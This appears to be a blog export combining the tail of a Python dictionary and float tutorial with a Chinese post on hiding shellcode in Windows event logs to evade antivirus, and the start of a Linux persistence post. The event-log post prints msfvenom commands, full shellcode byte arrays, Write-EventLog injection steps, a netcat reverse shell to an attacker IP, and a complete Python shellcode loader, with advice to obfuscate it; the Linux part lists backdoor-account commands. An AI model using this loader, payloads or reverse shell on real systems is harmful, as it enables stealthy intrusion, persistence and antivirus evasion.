<h4 id="7-2-2所有的键"><a href="#7-2-2所有的键" class="headerlink" title="7.2.2所有的键"></a>7.2.2所有的键</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">       &#125;</span><br><span class="line">data = info.keys()</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#dict_keys([&#x27;age&#x27;, &#x27;status&#x27;, &#x27;name&#x27;, &#x27;hobby&#x27;])</span></span><br><span class="line"><span class="comment">#这个输出的东西是可以被for循环的</span></span><br></pre></td></tr></table></figure>

<h4 id="7-2-3所有的值"><a href="#7-2-3所有的值" class="headerlink" title="7.2.3所有的值"></a>7.2.3所有的值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">       &#125;</span><br><span class="line">data = info.values()</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#dict_values([99, True, &#x27;dhk&#x27;, [&#x27;马戏团&#x27;, &#x27;小丑&#x27;]])</span></span><br></pre></td></tr></table></figure>

<h4 id="7-2-4所有的键值"><a href="#7-2-4所有的键值" class="headerlink" title="7.2.4所有的键值"></a>7.2.4所有的键值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">       &#125;</span><br><span class="line">data = info.items()</span><br><span class="line"><span class="built_in">print</span>(data)dict_items([(<span class="string">&#x27;age&#x27;</span>, <span class="number">99</span>), (<span class="string">&#x27;status&#x27;</span>, <span class="literal">True</span>), (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;dhk&#x27;</span>), (<span class="string">&#x27;hobby&#x27;</span>, [<span class="string">&#x27;马戏团&#x27;</span>, <span class="string">&#x27;小丑&#x27;</span>])])</span><br></pre></td></tr></table></figure>

<h4 id="7-2-5更新字典键值对"><a href="#7-2-5更新字典键值对" class="headerlink" title="7.2.5更新字典键值对"></a>7.2.5更新字典键值对</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">       &#125;</span><br><span class="line">info.update(&#123;<span class="string">&quot;sex&quot;</span>:<span class="string">&quot;男&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;joker&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(info)<span class="comment">#info中没有的键直接添加，有的键则更新值</span></span><br></pre></td></tr></table></figure>

<h4 id="7-2-6一处指定键值对"><a href="#7-2-6一处指定键值对" class="headerlink" title="7.2.6一处指定键值对"></a>7.2.6一处指定键值对</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">       &#125;</span><br><span class="line">data = info.pop(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(info)<span class="comment">#&#123;&#x27;status&#x27;: True, &#x27;name&#x27;: &#x27;dhk&#x27;, &#x27;hobby&#x27;: [&#x27;马戏团&#x27;, &#x27;小丑&#x27;]&#125;</span></span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#99</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="7-2-6案例扩展"><a href="#7-2-6案例扩展" class="headerlink" title="7.2.6案例扩展"></a>7.2.6案例扩展</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">实现输出一个人的个人信息格式如下</span></span><br><span class="line"><span class="string">name = [&#x27;名字&#x27;,&quot;性别&quot;,&quot;年龄&quot;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">info_stock = &#123;<span class="string">&quot;动感&quot;</span>:[<span class="string">&quot;动感&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;99&quot;</span>],</span><br><span class="line">              <span class="string">&quot;小丑&quot;</span>:[<span class="string">&quot;小丑&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;13&quot;</span>],</span><br><span class="line">              <span class="string">&quot;董小丑&quot;</span>:[<span class="string">&quot;董小丑&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;123&quot;</span>]</span><br><span class="line">              &#125;</span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;请输入您要查询的人物： &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>  <span class="keyword">not</span> num <span class="keyword">in</span> info_stock.keys():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入正确的人名！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = info_stock.get(num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;num&#125;</span> = <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="7-3公共功能"><a href="#7-3公共功能" class="headerlink" title="7.3公共功能"></a>7.3公共功能</h3><h4 id="也差不多啦，并集，长度，是否包含，索引（键），根据键修改值和删除值，for循环"><a href="#也差不多啦，并集，长度，是否包含，索引（键），根据键修改值和删除值，for循环" class="headerlink" title="也差不多啦，并集，长度，是否包含，索引（键），根据键修改值和删除值，for循环"></a>也差不多啦，并集，长度，是否包含，索引（键），根据键修改值和删除值，for循环</h4><h3 id="7-4转换和嵌套"><a href="#7-4转换和嵌套" class="headerlink" title="7.4转换和嵌套"></a>7.4转换和嵌套</h3><p>先要转换为字典使用dict()</p>
<p>在嵌套的时候，注意键值必须可hash（list,set,dict不可hash）</p>
<p>这里总结一下，集合元组必须可hash，字典的键必须可hash。</p>
<h2 id="8-浮点型（float）"><a href="#8-浮点型（float）" class="headerlink" title="8.浮点型（float）"></a>8.浮点型（float）</h2><p>浮点型，一般在开发中用于表示小数。</p>
<p>注意三点，</p>
<p>1.在类型转换时，浮点型转换为整型，将会把小数部分去掉。</p>
<p>2.想保留小数后n位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="number">3.1415926</span></span><br><span class="line">result = <span class="built_in">round</span>(v1,<span class="number">3</span>)<span class="comment">#会自动的给你四舍五入</span></span><br></pre></td></tr></table></figure>

<p>3.想要遇到精准的小数计算，需要使用decimal模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line">v1 = decimal.Decimal(<span class="string">&quot;0.1&quot;</span>)</span><br><span class="line">v2 = decimal.Decimal(<span class="string">&quot;0.2&quot;</span>)</span><br><span class="line">v3 = v1 + v2</span><br><span class="line"><span class="built_in">print</span>(v3)<span class="comment">#0.3</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>巧用Windows事件日志隐藏载荷</title>
    <url>/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/</url>
    <content><![CDATA[<h1 id="巧用Windows事件日志隐藏载荷"><a href="#巧用Windows事件日志隐藏载荷" class="headerlink" title="巧用Windows事件日志隐藏载荷"></a>巧用Windows事件日志隐藏载荷</h1><p>根据卡巴斯基发布的研究报告发现一项恶意活动，其中的技术涉及将shellcode直接放入Windows事件日志，Windows事件日志可以被攻击者用来掩盖特洛伊木马病毒的恶意使用。实现了”无文件”攻击技术.</p>
<p>简单来说就是将shellcode放到windows的日志中去，然后后续只需要用加载器加载日志中的shellcode就可以实现分离免杀了。</p>
<p>Windows事件日志文件实际上是以特定的数据结构的方式存储内容，每条记录事件的数据结构由9个字段组成，包括日志名称、来源、记录时间、事件ID、任务类别、级别、计算机、事件数据（EventData）等信息。其中事件数据<strong>仅支持消息和二进制数据</strong>。</p>
<h1 id="写入日志"><a href="#写入日志" class="headerlink" title="写入日志"></a>写入日志</h1><p>那么怎么把数据写入日志文件中呢，powershell中设置了一条命令，帮助我们方便的将数据写入日志文件中。</p>
<p>Write-EventLog命令可以将事件写入事件日志，参考微软官方文档，其中参数对应上面介绍的字段：</p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181147969.png" alt="image-20230317181147969"></p>
<p>执行命令：<code>Write-EventLog -LogName Application -Source VSS -EventID 65535 -EntryType Information -Category 0 -Message &quot;Hello World!&quot;</code></p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181314533.png" alt="image-20230317181314533"></p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181324210.png" alt="image-20230317181324210"></p>
<p>可以看到日志文件中已经有了我们写入的日志信息。</p>
<h1 id="弹计算器复现"><a href="#弹计算器复现" class="headerlink" title="弹计算器复现"></a>弹计算器复现</h1><h2 id="写入荷载"><a href="#写入荷载" class="headerlink" title="写入荷载"></a>写入荷载</h2><p>现在进行复现</p>
<p>只需在Write-EventLog中使用-RawData参数，就可以在事件日志字段中包含二进制数据，而且必须将二进制数据作为字节数组传到-RawData参数中。我们可以将其包含数据的十六进制字符串转换为字节数组，然后再传递。</p>
<p>首先，使用msfvenom生成弹计算器 payload。输出格式为十六进制字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=calc.exe -f hex </span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181847489.png" alt="image-20230317181847489"></p>
<p><a href="http://tools.bugscaner.com/text/hex2bytes.html">在线16进制字符串转bytes - 在线工具 (bugscaner.com)</a></p>
<p>用工具转换</p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317182124892.png" alt="image-20230317182124892"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$data = [Byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00)</span><br></pre></td></tr></table></figure>

<p>使用密钥管理服务日志和KmsRequests作为源进行事件日志写入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write-EventLog -LogName &#x27;Key Management Service&#x27; -Source KmsRequests -EventID 9999 -EntryType Information -Category 0 -Message &quot;Hello World!&quot; -RawData $data</span><br></pre></td></tr></table></figure>

<p>执行后，Payload已成功存储到事件日志当中。于事件日志的详细信息就能查看到。</p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317182436801.png" alt="image-20230317182436801"></p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317182459888.png" alt="image-20230317182459888"></p>
<h2 id="执行荷载"><a href="#执行荷载" class="headerlink" title="执行荷载"></a>执行荷载</h2><p>为了提取并执行写入的载荷，这边用非常简单的C++程序和Python脚本进行证明（大佬的）</p>
<p><a href="https://github.com/ldsaiyan/EventLogPersist">ldsaiyan/EventLogPersist: A Simple Proof Code for Extracting and Executing Shellcode from Event Logs (github.com)</a></p>
<p>我这里也会在最后把代码贴出来(笑死我了，我刚把代码贴出来就报毒了，这速度也太快了。后面代码大家可以参照我以前的做做混淆算了)</p>
<p>现在把python代码打包好上传到目标机器，然后执行。</p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317184607663.png" alt="image-20230317184607663"></p>
<p>成功弹出计算器</p>
<h1 id="反弹nc命令"><a href="#反弹nc命令" class="headerlink" title="反弹nc命令"></a>反弹nc命令</h1><p>但是这个上线是有大小限制的，我尝试生成msf的shellcode过大了，无法写入日志文件。</p>
<p>所以我觉得可以尝试用nc来弄？</p>
<p>反弹一个cmd出来</p>
<p>攻击机nc监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc.exe -lvvp 6666</span><br></pre></td></tr></table></figure>

<p>目标机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\nc.exe 192.168.75.1 6666 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>

<p>生成shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=&quot;C:\Users\24205\Desktop\netcat-win32-1.12\nc.exe 192.168.75.1 6666 -e c:\windows\system32\cmd.exe&quot; -f hex </span><br></pre></td></tr></table></figure>

<h2 id="注入并执行荷载"><a href="#注入并执行荷载" class="headerlink" title="注入并执行荷载"></a>注入并执行荷载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$data = [Byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x43, 0x3A, 0x5C, 0x55, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x32, 0x34, 0x32, 0x30, 0x35, 0x5C, 0x44, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70, 0x5C, 0x6E, 0x65, 0x74, 0x63, 0x61, 0x74, 0x2D, 0x77, 0x69, 0x6E, 0x33, 0x32, 0x2D, 0x31, 0x2E, 0x31, 0x32, 0x5C, 0x6E, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36, 0x38, 0x2E, 0x37, 0x35, 0x2E, 0x31, 0x20, 0x36, 0x36, 0x36, 0x36, 0x20, 0x2D, 0x65, 0x20, 0x63, 0x3A, 0x5C, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write-EventLog -LogName &#x27;Key Management Service&#x27; -Source KmsRequests -EventID 9999 -EntryType Information -Category 0 -Message &quot;Hello World!&quot; -RawData $data</span><br></pre></td></tr></table></figure>

<p>然后点击加载器,遂成功</p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317211809036.png" alt="image-20230317211809036"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="用户限制"><a href="#用户限制" class="headerlink" title="用户限制"></a>用户限制</h2><p>事件日志的写入权限问题。为了能在事件日志条目中存储有效负载，我们拿到的权限必须要能写入日志。</p>
<h2 id="大小限制"><a href="#大小限制" class="headerlink" title="大小限制"></a>大小限制</h2><p>需要注意的另一个限制是，事件日志中可以存储的数据量有大小限制。基于事件消息字符串的最大字符限制为31,839个字符。</p>
<h2 id="更持久"><a href="#更持久" class="headerlink" title="更持久"></a>更持久</h2><p>在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\对应的日志名称下的条目中，存在一个EventMessageFile属性。如果在注入载荷的时候，事件ID不存在于该属性指定的源关联的事件消息文件中，则会出现下图这个日志消息：</p>
<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317192555763.png" alt="image-20230317192555763"></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> win32evtlog</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">logtype = <span class="string">&#x27;Key Management Service&#x27;</span></span><br><span class="line">hand = win32evtlog.OpenEventLog(server, logtype)</span><br><span class="line">flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ</span><br><span class="line">total = win32evtlog.GetNumberOfEventLogRecords(hand)</span><br><span class="line">switch = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">    <span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">    ctypes .windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">        ctypes.c_uint64(ptr),</span><br><span class="line">        buf,</span><br><span class="line">        ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.c_uint64(ptr),</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    events = win32evtlog.ReadEventLog(hand, flags, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> events:</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line">            <span class="built_in">print</span>(event.Data)</span><br><span class="line">            <span class="keyword">if</span> event.Data:</span><br><span class="line">                switch = calc(event.Data)</span><br><span class="line">    <span class="keyword">if</span> switch:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>常见linux维权方法-权限维持与后门处置</title>
    <url>/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="常见linux维权方法-权限维持与后门处置"><a href="#常见linux维权方法-权限维持与后门处置" class="headerlink" title="常见linux维权方法-权限维持与后门处置"></a>常见linux维权方法-权限维持与后门处置</h1><h1 id="linux常见维权方法"><a href="#linux常见维权方法" class="headerlink" title="linux常见维权方法"></a>linux常见维权方法</h1><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建一个用户名guest密码123456的普通用户</span><br><span class="line">useradd -p `openssl passwd -l -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line">useradd -p方法，``是用来存放可执行的系统命令， 其中openssl passwd可以理解为一种加密方式</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd    // /etc/shadow用这个命令可以写入</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>

<h2 id="可疑用户排查技巧"><a href="#可疑用户排查技巧" class="headerlink" title="可疑用户排查技巧"></a>可疑用户排查技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询特权用户（uid为0）</span><br><span class="line">awk -F: &#x27;$3==0&#123;print$1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/01/%E5%B8%B8%E8%A7%81linux%E7%BB%B4%E6%9D%83%E6%96%B9%E6%B3%95-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E5%90%8E%E9%97%A8%E5%A4%84%E7%BD%AE/image-20240201005717935.png" alt="image-20240201005717935"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询可以远程登录的账号信息</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print$1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>

